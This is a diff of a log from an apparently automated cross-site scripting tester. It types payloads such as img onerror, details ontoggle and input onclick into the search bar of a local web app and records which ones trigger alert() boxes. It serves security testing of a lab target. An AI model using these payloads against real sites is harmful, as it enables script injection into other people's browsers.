@@ -1,141 +1,806 @@
-2025-06-27 00:08:31,562 - INFO - WebDriver initialized
-2025-06-27 00:08:31,563 - INFO - Testing 14 search_bar payloads
-2025-06-27 00:08:31,782 - INFO - Confirmed overlays are dismissed
-2025-06-27 00:08:38,938 - INFO - Angular page stabilized
-2025-06-27 00:08:38,938 - INFO - Page state reset for search bar
-2025-06-27 00:08:44,119 - INFO - Search bar is closed; attempting to open (attempt 1)
-2025-06-27 00:08:44,193 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
-2025-06-27 00:08:45,316 - WARNING - Failed to open search bar: Message: element click intercepted: Element <mat-icon _ngcontent-ng-c2529363319="" role="img" matripple="" class="mat-icon notranslate mat-ripple mat-search_icon-search ng-tns-c2529363319-0 material-icons mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font">...</mat-icon> is not clickable at point (1694, 12). Other element would receive the click: <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
-  (Session info: chrome=138.0.7204.49)
+2025-06-28 05:14:12,705 - INFO - WebDriver initialized
+2025-06-28 05:14:12,705 - INFO - Testing 29 search_bar payloads
+2025-06-28 05:14:12,705 - INFO - Processing payload 1 of 29: %3E%3Cimg src=x onerror=alert(fGQrx)%3E
+2025-06-28 05:14:14,719 - INFO - No more alerts detected
+2025-06-28 05:14:21,241 - INFO - Angular page stabilized
+2025-06-28 05:14:21,254 - INFO - Page state fully reset
+2025-06-28 05:14:23,268 - INFO - No more alerts detected
+2025-06-28 05:14:23,293 - INFO - Hid overlay via JavaScript
+2025-06-28 05:14:29,383 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:14:34,524 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:14:34,559 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:14:34,615 - INFO - Clicked search icon to open search bar
+2025-06-28 05:14:35,185 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:14:35,207 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:14:35,213 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:14:40,037 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:14:40,059 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:14:43,070 - INFO - No more alerts detected
+2025-06-28 05:14:43,086 - INFO - Payload %3E%3Cimg src=x onerror=alert(fGQrx)%3E injected into DOM without alert
+2025-06-28 05:14:43,089 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:14:43,091 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:14:45,101 - INFO - No more alerts detected
+2025-06-28 05:14:45,917 - INFO - Angular page stabilized
+2025-06-28 05:14:45,927 - INFO - Page state fully reset
+2025-06-28 05:14:45,927 - INFO - Processing payload 2 of 29: ><img src=x onerror=alert(xqQiS)>
+2025-06-28 05:14:47,938 - INFO - No more alerts detected
+2025-06-28 05:14:48,710 - INFO - Angular page stabilized
+2025-06-28 05:14:48,721 - INFO - Page state fully reset
+2025-06-28 05:14:50,733 - INFO - No more alerts detected
+2025-06-28 05:14:50,747 - INFO - Hid overlay via JavaScript
+2025-06-28 05:14:56,876 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:15:02,038 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:15:02,070 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:15:02,113 - INFO - Clicked search icon to open search bar
+2025-06-28 05:15:02,690 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:15:02,706 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:15:02,711 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:15:06,773 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:15:06,791 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:15:09,804 - INFO - No more alerts detected
+2025-06-28 05:15:12,827 - INFO - Current URL after submission: http://localhost:3000/#/search?q=%3E%3Cimg%20src%3Dx%20onerror%3Dalert(xqQiS)%3E
+2025-06-28 05:15:12,840 - INFO - Angular page stabilized
+2025-06-28 05:15:12,853 - INFO - Rendered HTML after submission: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:15:14,869 - INFO - No more alerts detected
+2025-06-28 05:15:14,870 - INFO - Payload ><img src=x onerror=alert(xqQiS)> did not trigger alert or DOM change in search_bar
+2025-06-28 05:15:14,871 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:15:14,872 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:15:14,872 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:15:16,885 - INFO - No more alerts detected
+2025-06-28 05:15:17,732 - INFO - Angular page stabilized
+2025-06-28 05:15:17,745 - INFO - Page state fully reset
+2025-06-28 05:15:17,745 - INFO - Processing payload 3 of 29: %3Cbutton onfocus=alert(bWcMw)%3E
+2025-06-28 05:15:19,757 - INFO - No more alerts detected
+2025-06-28 05:15:20,524 - INFO - Angular page stabilized
+2025-06-28 05:15:20,533 - INFO - Page state fully reset
+2025-06-28 05:15:22,545 - INFO - No more alerts detected
+2025-06-28 05:15:22,565 - INFO - Hid overlay via JavaScript
+2025-06-28 05:15:28,656 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:15:33,781 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:15:33,810 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:15:33,857 - INFO - Clicked search icon to open search bar
+2025-06-28 05:15:34,426 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:15:34,441 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:15:34,446 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:15:38,505 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:15:38,521 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:15:41,536 - INFO - No more alerts detected
+2025-06-28 05:15:46,618 - WARNING - No focusable/toggleable element found for %3Cbutton onfocus=alert(bWcMw)%3E: Message: 
 Stacktrace:
-	GetHandleVerifier [0x0x7ff68ba46f65+76917]
-	GetHandleVerifier [0x0x7ff68ba46fc0+77008]
-	(No symbol) [0x0x7ff68b7f9dea]
-	(No symbol) [0x0x7ff68b858269]
-	(No symbol) [0x0x7ff68b855c02]
-	(No symbol) [0x0x7ff68b852c41]
-	(No symbol) [0x0x7ff68b851b31]
-	(No symbol) [0x0x7ff68b843368]
-	(No symbol) [0x0x7ff68b87846a]
-	(No symbol) [0x0x7ff68b842c16]
-	(No symbol) [0x0x7ff68b878680]
-	(No symbol) [0x0x7ff68b8a065c]
-	(No symbol) [0x0x7ff68b878243]
-	(No symbol) [0x0x7ff68b841431]
-	(No symbol) [0x0x7ff68b8421c3]
-	GetHandleVerifier [0x0x7ff68bd1d29d+3051437]
-	GetHandleVerifier [0x0x7ff68bd178f3+3028483]
-	GetHandleVerifier [0x0x7ff68bd3588d+3151261]
-	GetHandleVerifier [0x0x7ff68ba6182e+185662]
-	GetHandleVerifier [0x0x7ff68ba696ef+218111]
-	GetHandleVerifier [0x0x7ff68ba4fae4+112628]
-	GetHandleVerifier [0x0x7ff68ba4fc99+113065]
-	GetHandleVerifier [0x0x7ff68ba36c68+10616]
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff786890256]
+	(No symbol) [0x0x7ff78689050c]
+	(No symbol) [0x0x7ff7868e3887]
+	(No symbol) [0x0x7ff7868b84af]
+	(No symbol) [0x0x7ff7868e065c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
 	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
 	RtlUserThreadStart [0x0x7ffea749c34c+44]
 
-2025-06-27 00:08:50,517 - INFO - Search bar is closed; attempting to open (attempt 2)
-2025-06-27 00:08:50,560 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
-2025-06-27 00:08:51,649 - WARNING - Failed to open search bar: Message: element click intercepted: Element <mat-icon _ngcontent-ng-c2529363319="" role="img" matripple="" class="mat-icon notranslate mat-ripple mat-search_icon-search ng-tns-c2529363319-0 material-icons mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font">...</mat-icon> is not clickable at point (1694, 12). Other element would receive the click: <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
-  (Session info: chrome=138.0.7204.49)
-Stacktrace:
-	GetHandleVerifier [0x0x7ff68ba46f65+76917]
-	GetHandleVerifier [0x0x7ff68ba46fc0+77008]
-	(No symbol) [0x0x7ff68b7f9dea]
-	(No symbol) [0x0x7ff68b858269]
-	(No symbol) [0x0x7ff68b855c02]
-	(No symbol) [0x0x7ff68b852c41]
-	(No symbol) [0x0x7ff68b851b31]
-	(No symbol) [0x0x7ff68b843368]
-	(No symbol) [0x0x7ff68b87846a]
-	(No symbol) [0x0x7ff68b842c16]
-	(No symbol) [0x0x7ff68b878680]
-	(No symbol) [0x0x7ff68b8a065c]
-	(No symbol) [0x0x7ff68b878243]
-	(No symbol) [0x0x7ff68b841431]
-	(No symbol) [0x0x7ff68b8421c3]
-	GetHandleVerifier [0x0x7ff68bd1d29d+3051437]
-	GetHandleVerifier [0x0x7ff68bd178f3+3028483]
-	GetHandleVerifier [0x0x7ff68bd3588d+3151261]
-	GetHandleVerifier [0x0x7ff68ba6182e+185662]
-	GetHandleVerifier [0x0x7ff68ba696ef+218111]
-	GetHandleVerifier [0x0x7ff68ba4fae4+112628]
-	GetHandleVerifier [0x0x7ff68ba4fc99+113065]
-	GetHandleVerifier [0x0x7ff68ba36c68+10616]
-	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
-	RtlUserThreadStart [0x0x7ffea749c34c+44]
-
-2025-06-27 00:08:56,804 - INFO - Search bar is closed; attempting to open (attempt 3)
-2025-06-27 00:08:56,850 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
-2025-06-27 00:08:57,890 - WARNING - Failed to open search bar: Message: element click intercepted: Element <mat-icon _ngcontent-ng-c2529363319="" role="img" matripple="" class="mat-icon notranslate mat-ripple mat-search_icon-search ng-tns-c2529363319-0 material-icons mat-ligature-font mat-icon-no-color" aria-hidden="true" data-mat-icon-type="font">...</mat-icon> is not clickable at point (1694, 12). Other element would receive the click: <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
-  (Session info: chrome=138.0.7204.49)
-Stacktrace:
-	GetHandleVerifier [0x0x7ff68ba46f65+76917]
-	GetHandleVerifier [0x0x7ff68ba46fc0+77008]
-	(No symbol) [0x0x7ff68b7f9dea]
-	(No symbol) [0x0x7ff68b858269]
-	(No symbol) [0x0x7ff68b855c02]
-	(No symbol) [0x0x7ff68b852c41]
-	(No symbol) [0x0x7ff68b851b31]
-	(No symbol) [0x0x7ff68b843368]
-	(No symbol) [0x0x7ff68b87846a]
-	(No symbol) [0x0x7ff68b842c16]
-	(No symbol) [0x0x7ff68b878680]
-	(No symbol) [0x0x7ff68b8a065c]
-	(No symbol) [0x0x7ff68b878243]
-	(No symbol) [0x0x7ff68b841431]
-	(No symbol) [0x0x7ff68b8421c3]
-	GetHandleVerifier [0x0x7ff68bd1d29d+3051437]
-	GetHandleVerifier [0x0x7ff68bd178f3+3028483]
-	GetHandleVerifier [0x0x7ff68bd3588d+3151261]
-	GetHandleVerifier [0x0x7ff68ba6182e+185662]
-	GetHandleVerifier [0x0x7ff68ba696ef+218111]
-	GetHandleVerifier [0x0x7ff68ba4fae4+112628]
-	GetHandleVerifier [0x0x7ff68ba4fc99+113065]
-	GetHandleVerifier [0x0x7ff68ba36c68+10616]
-	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
-	RtlUserThreadStart [0x0x7ffea749c34c+44]
-
-2025-06-27 00:08:58,050 - INFO - Screenshot saved: mshield/logs/screenshot_audiosrc_attempt_1_20250627_000857.png
-2025-06-27 00:08:58,050 - ERROR - Error for payload <audio src=x onerror=alert(1)> on attempt 1: Message: Failed to open search bar after retries
-
-2025-06-27 00:08:58,050 - INFO - Retrying payload <audio src=x onerror=alert(1)> due to error
-2025-06-27 00:08:58,084 - INFO - Hid overlay via JavaScript
-2025-06-27 00:09:05,189 - INFO - No overlays found or dismissal timed out
-2025-06-27 00:09:05,230 - INFO - Angular page stabilized
-2025-06-27 00:09:05,230 - INFO - Page state reset for search bar
-2025-06-27 00:09:10,412 - INFO - Search bar is closed; attempting to open (attempt 1)
-2025-06-27 00:09:10,465 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
-2025-06-27 00:09:10,535 - INFO - Clicked search icon to open search bar
-2025-06-27 00:09:10,608 - INFO - Found search_bar input with selector: #mat-input-1
-2025-06-27 00:09:10,635 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
-2025-06-27 00:09:10,641 - INFO - Activated search bar input with mousedown, click, and focus
-2025-06-27 00:09:14,711 - INFO - Typed payload character-by-character and maintained focus
-2025-06-27 00:09:14,747 - INFO - Submitted search bar with JavaScript ENTER key and form submit event
-2025-06-27 00:09:39,170 - INFO - WebDriver closed
-2025-06-27 00:09:39,171 - ERROR - Main error: Alert Text: 1
+2025-06-28 05:15:46,628 - INFO - Payload %3Cbutton onfocus=alert(bWcMw)%3E injected into DOM without alert
+2025-06-28 05:15:46,630 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:15:46,631 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:15:46,631 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:15:48,641 - INFO - No more alerts detected
+2025-06-28 05:15:49,443 - INFO - Angular page stabilized
+2025-06-28 05:15:49,454 - INFO - Page state fully reset
+2025-06-28 05:15:49,454 - INFO - Processing payload 4 of 29: ><details open ontoggle=alert(1)>
+2025-06-28 05:15:51,465 - INFO - No more alerts detected
+2025-06-28 05:15:52,188 - INFO - Angular page stabilized
+2025-06-28 05:15:52,197 - INFO - Page state fully reset
+2025-06-28 05:15:54,208 - INFO - No more alerts detected
+2025-06-28 05:15:54,230 - INFO - Hid overlay via JavaScript
+2025-06-28 05:16:00,317 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:16:05,463 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:16:05,493 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:16:05,536 - INFO - Clicked search icon to open search bar
+2025-06-28 05:16:06,120 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:16:06,136 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:16:06,140 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:16:10,219 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:16:10,246 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:16:11,251 - INFO - Handled alert with text: 1
+2025-06-28 05:16:11,754 - WARNING - Error handling alert: Alert Text: 1
 Message: unexpected alert open: {Alert text : 1}
   (Session info: chrome=138.0.7204.49)
 Stacktrace:
-	GetHandleVerifier [0x0x7ff68ba46f65+76917]
-	GetHandleVerifier [0x0x7ff68ba46fc0+77008]
-	(No symbol) [0x0x7ff68b7f9dea]
-	(No symbol) [0x0x7ff68b80a939]
-	(No symbol) [0x0x7ff68b81178a]
-	(No symbol) [0x0x7ff68b7e608d]
-	(No symbol) [0x0x7ff68b809e11]
-	(No symbol) [0x0x7ff68b8a0535]
-	(No symbol) [0x0x7ff68b878243]
-	(No symbol) [0x0x7ff68b841431]
-	(No symbol) [0x0x7ff68b8421c3]
-	GetHandleVerifier [0x0x7ff68bd1d29d+3051437]
-	GetHandleVerifier [0x0x7ff68bd178f3+3028483]
-	GetHandleVerifier [0x0x7ff68bd3588d+3151261]
-	GetHandleVerifier [0x0x7ff68ba6182e+185662]
-	GetHandleVerifier [0x0x7ff68ba696ef+218111]
-	GetHandleVerifier [0x0x7ff68ba4fae4+112628]
-	GetHandleVerifier [0x0x7ff68ba4fc99+113065]
-	GetHandleVerifier [0x0x7ff68ba36c68+10616]
+	GetHandleVerifier [0x0x7ff786a86f65+76917]
+	GetHandleVerifier [0x0x7ff786a86fc0+77008]
+	(No symbol) [0x0x7ff786839dea]
+	(No symbol) [0x0x7ff7868e110c]
+	(No symbol) [0x0x7ff7868b8243]
+	(No symbol) [0x0x7ff786881431]
+	(No symbol) [0x0x7ff7868821c3]
+	GetHandleVerifier [0x0x7ff786d5d29d+3051437]
+	GetHandleVerifier [0x0x7ff786d578f3+3028483]
+	GetHandleVerifier [0x0x7ff786d7588d+3151261]
+	GetHandleVerifier [0x0x7ff786aa182e+185662]
+	GetHandleVerifier [0x0x7ff786aa96ef+218111]
+	GetHandleVerifier [0x0x7ff786a8fae4+112628]
+	GetHandleVerifier [0x0x7ff786a8fc99+113065]
+	GetHandleVerifier [0x0x7ff786a76c68+10616]
 	BaseThreadInitThunk [0x0x7ffea560e8d7+23]
 	RtlUserThreadStart [0x0x7ffea749c34c+44]
 
+2025-06-28 05:16:11,754 - INFO - Payload ><details open ontoggle=alert(1)> triggered alert in search_bar immediately: 1
+2025-06-28 05:16:11,776 - INFO - Rendered HTML after alert: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:16:11,779 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:16:11,779 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:16:11,780 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:16:13,795 - INFO - No more alerts detected
+2025-06-28 05:16:14,608 - INFO - Angular page stabilized
+2025-06-28 05:16:14,621 - INFO - Page state fully reset
+2025-06-28 05:16:14,621 - INFO - Processing payload 5 of 29: <select onchange=alert(1)>
+2025-06-28 05:16:16,633 - INFO - No more alerts detected
+2025-06-28 05:16:17,384 - INFO - Angular page stabilized
+2025-06-28 05:16:17,399 - INFO - Page state fully reset
+2025-06-28 05:16:19,414 - INFO - No more alerts detected
+2025-06-28 05:16:19,445 - INFO - Hid overlay via JavaScript
+2025-06-28 05:16:25,530 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:16:30,670 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:16:30,704 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:16:30,759 - INFO - Clicked search icon to open search bar
+2025-06-28 05:16:31,331 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:16:31,350 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:16:31,354 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:16:34,564 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:16:34,581 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:16:37,592 - INFO - No more alerts detected
+2025-06-28 05:16:37,892 - INFO - Simulated click on element with <select onchange=alert(1)>
+2025-06-28 05:16:40,904 - INFO - No more alerts detected
+2025-06-28 05:16:43,924 - INFO - Current URL after submission: http://localhost:3000/#/search?q=%3Cselect%20onchange%3Dalert(1)%3E
+2025-06-28 05:16:43,940 - INFO - Angular page stabilized
+2025-06-28 05:16:43,952 - INFO - Rendered HTML after submission: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:16:45,966 - INFO - No more alerts detected
+2025-06-28 05:16:45,966 - INFO - Payload <select onchange=alert(1)> did not trigger alert or DOM change in search_bar
+2025-06-28 05:16:45,968 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:16:45,968 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:16:45,969 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:16:47,980 - INFO - No more alerts detected
+2025-06-28 05:16:48,905 - INFO - Angular page stabilized
+2025-06-28 05:16:48,920 - INFO - Page state fully reset
+2025-06-28 05:16:48,920 - INFO - Processing payload 6 of 29: ><input onclick=alert(1)>
+2025-06-28 05:16:50,932 - INFO - No more alerts detected
+2025-06-28 05:16:51,713 - INFO - Angular page stabilized
+2025-06-28 05:16:51,725 - INFO - Page state fully reset
+2025-06-28 05:16:53,737 - INFO - No more alerts detected
+2025-06-28 05:16:53,760 - INFO - Hid overlay via JavaScript
+2025-06-28 05:16:59,842 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:17:04,998 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:17:05,028 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:17:05,074 - INFO - Clicked search icon to open search bar
+2025-06-28 05:17:05,688 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:17:05,716 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:17:05,725 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:17:08,921 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:17:08,943 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:17:11,959 - INFO - No more alerts detected
+2025-06-28 05:17:12,241 - INFO - Simulated click on element with ><input onclick=alert(1)>
+2025-06-28 05:17:13,246 - INFO - Handled alert with text: 1
+2025-06-28 05:17:15,763 - INFO - No more alerts detected
+2025-06-28 05:17:15,764 - INFO - Payload ><input onclick=alert(1)> triggered alert in search_bar after click: 1
+2025-06-28 05:17:15,775 - INFO - Rendered HTML after click: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:17:15,777 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:17:15,778 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:17:15,778 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:17:17,788 - INFO - No more alerts detected
+2025-06-28 05:17:18,509 - INFO - Angular page stabilized
+2025-06-28 05:17:18,519 - INFO - Page state fully reset
+2025-06-28 05:17:18,519 - INFO - Processing payload 7 of 29: <marquee onstart=alert(1)>
+2025-06-28 05:17:20,529 - INFO - No more alerts detected
+2025-06-28 05:17:21,245 - INFO - Angular page stabilized
+2025-06-28 05:17:21,253 - INFO - Page state fully reset
+2025-06-28 05:17:23,267 - INFO - No more alerts detected
+2025-06-28 05:17:23,282 - INFO - Hid overlay via JavaScript
+2025-06-28 05:17:29,364 - WARNING - Overlay dismissal timed out, proceeding anyway
+2025-06-28 05:17:34,497 - INFO - Search bar is closed; attempting to open (attempt 1)
+2025-06-28 05:17:34,528 - INFO - Found search icon with selector: mat-icon.mat-icon.notranslate.mat-ripple.mat-search_icon-search.ng-tns-c2529363319-0.material-icons.mat-ligature-font.mat-icon-no-color
+2025-06-28 05:17:34,573 - INFO - Clicked search icon to open search bar
+2025-06-28 05:17:35,141 - INFO - Found search_bar input with selector: #mat-input-1
+2025-06-28 05:17:35,157 - INFO - Targeting search_bar with selector #mat-input-1: {'id': 'mat-input-1', 'placeholder': '', 'name': '', 'class': 'mat-mdc-input-element mat-mdc-form-field-input-control mdc-text-field__input ng-untouched ng-pristine cdk-text-field-autofill-monitored ng-valid'}
+2025-06-28 05:17:35,161 - INFO - Activated search_bar input with mousedown, click, and focus
+2025-06-28 05:17:38,361 - INFO - Typed payload character-by-character and maintained focus
+2025-06-28 05:17:38,378 - INFO - Submitted search_bar with JavaScript ENTER key and form submit event
+2025-06-28 05:17:41,395 - INFO - No more alerts detected
+2025-06-28 05:17:44,412 - INFO - Current URL after submission: http://localhost:3000/#/search?q=%3Cmarquee%20onstart%3Dalert(1)%3E
+2025-06-28 05:17:44,426 - INFO - Angular page stabilized
+2025-06-28 05:17:44,437 - INFO - Rendered HTML after submission: <div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override--1225450786 " style=""><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">This website uses fruit cookies to ensure you get the juiciest tracking experience. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://www.youtube.com/watch?v=9P...
+2025-06-28 05:17:46,452 - INFO - No more alerts detected
+2025-06-28 05:17:46,452 - INFO - Payload <marquee onstart=alert(1)> did not trigger alert or DOM change in search_bar
+2025-06-28 05:17:46,457 - INFO - Results saved to data/auto_test_results.csv
+2025-06-28 05:17:46,457 - INFO - Working payloads appended to data/mshield_working_xss.txt
+2025-06-28 05:17:46,458 - INFO - Failed payloads appended to data/mshield_failed_xss.txt
+2025-06-28 05:17:48,471 - INFO - No more alerts detected
+2025-06-28 05:17:49,313 - INFO - Angular page stabilized
+2025-06-28 05:17:49,323 - INFO - Page state fully reset
+2025-06-28 05:17:49,323 - INFO - Processing payload 8 of 29: >><img src=x onerror=alert(1)>
